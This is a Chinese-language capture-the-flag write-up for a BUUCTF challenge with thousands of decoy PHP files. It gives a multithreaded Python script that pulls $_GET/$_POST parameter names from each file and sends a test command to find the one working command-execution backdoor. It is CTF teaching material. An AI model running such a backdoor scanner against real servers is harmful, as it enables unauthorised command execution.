BUUCTF 网址：https://buuoj.cn/challenges

题目信息

进入环境，得到如下信息

因此访问如下网址，将源码下载下来 

http://12e408b2-7b34-441d-a3f5-a689f716cfd5.node4.buuoj.cn:81/www.tar.gz

发现有 3002 个文件，并且除了一个 index.html 之外，其他的文件里面充斥着 $_GET $_POST system ，一看就是命令执行，但是随便打开文件，拿出一个尝试却不行。

因此认为，这3000+文件里面，只有一个文件的一个 payload 是有效的，其他的文件和 payload 只不过是这个 “高明的黑客” 弄出来的伪装。

解题

3000多文件，手动验证肯定是不可能的，因此使用脚本： 

import requests, os, re, time
from concurrent.futures import ThreadPoolExecutor, wait, ALL_COMPLETED, as_completed

url = 'http://127.0.0.1/BUUtest/src/'
filePath = 'D:\\phpStudy2018\\PHPTutorial\\WWW\\BUUtest\\src\\'

def exp(file):
    pattern = "(\$_POST|\$_GET)\['(.*?)'\]"
    gets = []
    posts = []
    print(f"正在尝试 {file}:")
    with open(filePath+file, 'r') as f:
        content = f.readlines()
    # 找出所有的 (\$_POST|\$_GET)\['(.*?)'\] 中的单引号的内容，即参数
    for line in content:
        s = re.search(pattern, line)
        if s:
            if "GET" in s.group():
                gets.append(s.group(2))
            else:
                posts.append(s.group(2))
        # print(gets)
        # print(posts)

    payload = 'echo "success!!!"'
    # 开始发送 GET 请求
    for get in gets:
        newUrl = url + file + "?" + get + "=" + payload
        # print(newUrl)
        r = requests.get(newUrl)
        time.sleep(0.5)
        # print(r.text)
        if "success" in r.text:
            print(f"find it! filename is {file}, method is get and payload is {get}")
            return True
    # 开始发送 POST 请求
    for post in posts:
        newUrl = url + file
        r = requests.post(newUrl, data={post: payload})
        time.sleep(0.5)
        # print(r.text)
        if "success" in r.text:
            print(f"find it! filename is {file}, method is post and payload is {post}")
            return True

if __name__ == '__main__':
    print("程序开始：")
    fileNames = os.listdir(filePath)
    startTime = time.time()
    executor = ThreadPoolExecutor(100)
    all_tasks = [executor.submit(exp, file) for file in fileNames]
    wait(all_tasks, return_when=ALL_COMPLETED)
    endTime = time.time()
    print('total time is {}'.format(str(endTime - startTime)))
    print("程序结束！")

这是最终版的脚本。之前用的单线程，可能跑一天都跑不出来，如果开启多线程，BUUOJ这个网址就会返回 too many requests 。因此最终的解决办法就是在自己主机上搭建环境，然后测试。
